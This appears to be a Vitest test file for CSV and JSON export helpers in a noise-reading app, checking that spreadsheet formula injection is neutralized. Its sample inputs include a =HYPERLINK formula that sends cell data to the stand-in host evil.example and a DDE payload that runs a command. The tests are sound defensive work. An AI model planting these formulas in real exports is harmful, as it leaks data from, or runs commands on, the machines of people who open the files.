import { describe, expect, it } from 'vitest';
import type { NoiseReading } from '@/types/NoiseReading';
import { buildCsv, buildJsonExport, csvCell, csvFixed } from '@/utils/exportHelpers';

const HEADERS = [
  'Timestamp',
  'Location',
  'Latitude',
  'Longitude',
  'Noise Level (dB)',
  'Category',
  'Type',
  'Confidence (%)',
  'User Email',
];

// Built from local-time parts: the export formats in local time, so the
// expected text is the same in every time zone.
const CAPTURED_AT = new Date(2026, 0, 15, 10, 30, 0);

const HOSTILE_FORMULA = '=HYPERLINK("https://evil.example/?d="&B2&C2,"Open")';
const HOSTILE_QUOTE = `x","=cmd|' /C calc'!A0`;

function reading(overrides: Partial<NoiseReading> = {}): NoiseReading {
  return {
    id: 'r1',
    userId: 'uid1',
    userEmail: 'ab***@example.com',
    decibelLevel: 65.2,
    latitude: 6.9271,
    longitude: 79.8612,
    locationName: 'Colombo Fort',
    soundClass: 'Traffic',
    soundType: 'Pollution',
    confidence: 0.5,
    timestamp: CAPTURED_AT.getTime(),
    createdAt: null,
    ...overrides,
  };
}

/** Minimal RFC 4180 reader: quotes, doubled quotes, and newlines inside quotes. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let inQuotes = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i];
    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else {
          inQuotes = false;
        }
      } else {
        cell += ch;
      }
    } else if (ch === '"') {
      inQuotes = true;
    } else if (ch === ',') {
      row.push(cell);
      cell = '';
    } else if (ch === '\n') {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else {
      cell += ch;
    }
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

describe('csvCell', () => {
  it('wraps a value in double quotes', () => {
    expect(csvCell('abc')).toBe('"abc"');
  });

  it('doubles embedded quotes', () => {
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
  });

  it('prefixes an apostrophe to a formula such as =HYPERLINK', () => {
    expect(csvCell(HOSTILE_FORMULA)).toBe(
      `"'=HYPERLINK(""https://evil.example/?d=""&B2&C2,""Open"")"`,
    );
  });

  it.each(['=', '+', '-', '@', '\t', '\r'])('neutralizes a leading %j', (lead) => {
    expect(csvCell(`${lead}1+1`)).toBe(`"'${lead}1+1"`);
  });

  it('leaves a safe string alone, even with = inside', () => {
    expect(csvCell('a=b')).toBe('"a=b"');
  });

  it('writes null and undefined as an empty cell', () => {
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(null)).toBe('""');
    expect(csvCell('')).toBe('""');
  });

  it('writes a finite number as plain text, so a negative coordinate stays numeric', () => {
    expect(csvCell(6.9271)).toBe('"6.9271"');
    expect(csvCell(-79.8612)).toBe('"-79.8612"');
  });

  it('still neutralizes a numeric-looking STRING with a leading minus', () => {
    expect(csvCell('-79.8612')).toBe(`"'-79.8612"`);
  });

  it('writes NaN and Infinity as an empty cell', () => {
    expect(csvCell(NaN)).toBe('""');
    expect(csvCell(Infinity)).toBe('""');
  });
});

describe('csvFixed', () => {
  it('formats with a fixed number of decimals', () => {
    expect(csvFixed(65.2, 1)).toBe('"65.2"');
    expect(csvFixed(50, 2)).toBe('"50.00"');
    expect(csvFixed(-3.04, 1)).toBe('"-3.0"');
  });

  it('writes a missing or non-finite value as an empty cell', () => {
    expect(csvFixed(null, 1)).toBe('""');
    expect(csvFixed(undefined, 1)).toBe('""');
    expect(csvFixed(NaN, 1)).toBe('""');
  });
});

describe('buildCsv', () => {
  it('writes the header row', () => {
    expect(parseCsv(buildCsv([]))[0]).toEqual(HEADERS);
  });

  it('writes no byte-order mark (exportToCSV adds it)', () => {
    expect(buildCsv([]).charCodeAt(0)).not.toBe(0xfeff);
  });

  it('writes one nine-column row per reading', () => {
    const rows = parseCsv(buildCsv([reading(), reading({ id: 'r2' })]));
    expect(rows).toHaveLength(3);
    for (const row of rows) {
      expect(row).toHaveLength(9);
    }
  });

  it('writes every field of a normal reading', () => {
    const rows = parseCsv(buildCsv([reading()]));
    expect(rows[1]).toEqual([
      '2026-01-15 10:30:00',
      'Colombo Fort',
      '6.9271',
      '79.8612',
      '65.2',
      'Traffic',
      'Pollution',
      '50.00',
      'uid1',
    ]);
  });

  it('neutralizes a formula in locationName and keeps nine columns', () => {
    const rows = parseCsv(buildCsv([reading({ locationName: HOSTILE_FORMULA })]));
    expect(rows[1]).toHaveLength(9);
    expect(rows[1][1]).toBe(`'${HOSTILE_FORMULA}`);
  });

  it('keeps a quote-bearing soundClass inside its own cell', () => {
    const rows = parseCsv(buildCsv([reading({ soundClass: HOSTILE_QUOTE })]));
    expect(rows[1]).toHaveLength(9);
    expect(rows[1][5]).toBe(HOSTILE_QUOTE);
  });

  it('neutralizes a soundClass that starts with a formula character', () => {
    const rows = parseCsv(buildCsv([reading({ soundClass: "=cmd|' /C calc'!A0" })]));
    expect(rows[1][5]).toBe(`'=cmd|' /C calc'!A0`);
  });

  it('neutralizes a leading minus and a leading tab in text columns', () => {
    const minus = parseCsv(buildCsv([reading({ locationName: '-1+1' })]));
    expect(minus[1][1]).toBe("'-1+1");
    const tab = parseCsv(buildCsv([reading({ locationName: '\t=1' })]));
    expect(tab[1][1]).toBe("'\t=1");
  });

  it('keeps a newline inside its quoted cell as one data row', () => {
    const rows = parseCsv(buildCsv([reading({ locationName: 'a\nb' })]));
    expect(rows).toHaveLength(2);
    expect(rows[1][1]).toBe('a\nb');
  });

  it('writes empty cells, not placeholders, for missing values', () => {
    const rows = parseCsv(
      buildCsv([
        reading({
          locationName: '',
          soundClass: undefined,
          confidence: undefined,
          timestamp: null,
        }),
      ]),
    );
    expect(rows[1][0]).toBe('');
    expect(rows[1][1]).toBe('');
    expect(rows[1][5]).toBe('Unclassified');
    expect(rows[1][7]).toBe('');
  });

  it('keeps negative coordinates numeric', () => {
    const rows = parseCsv(buildCsv([reading({ latitude: -33.8688, longitude: -151.2093 })]));
    expect(rows[1][2]).toBe('-33.8688');
    expect(rows[1][3]).toBe('-151.2093');
  });
});

describe('buildJsonExport', () => {
  it('writes the metadata', () => {
    const json = buildJsonExport([reading()], new Date(2026, 5, 1, 8, 0, 0));
    expect(json.metadata.exportDate).toBe('2026-06-01 08:00:00');
    expect(json.metadata.totalRecords).toBe(1);
  });

  it('writes every field of a normal reading', () => {
    const json = buildJsonExport([reading()], new Date());
    expect(json.readings[0]).toMatchObject({
      id: 'r1',
      timestamp: '2026-01-15 10:30:00',
      location: { name: 'Colombo Fort', coordinates: { latitude: 6.9271, longitude: 79.8612 } },
      measurement: {
        decibelLevel: 65.2,
        noiseLevel: 'moderate',
        soundCategory: 'Traffic',
        soundType: 'Pollution',
        confidence: 0.5,
      },
      userId: 'uid1',
    });
  });

  it('uses the shared 50 / 70 dB band edges', () => {
    const levels = [49.9, 50, 70, 70.1].map((decibelLevel) =>
      buildJsonExport([reading({ decibelLevel })], new Date()).readings[0].measurement.noiseLevel,
    );
    expect(levels).toEqual(['low', 'moderate', 'moderate', 'high']);
  });

  it('writes null confidence and Unknown timestamp when absent', () => {
    const json = buildJsonExport([reading({ confidence: undefined, timestamp: null })], new Date());
    expect(json.readings[0].measurement.confidence).toBeNull();
    expect(json.readings[0].timestamp).toBe('Unknown');
  });
});
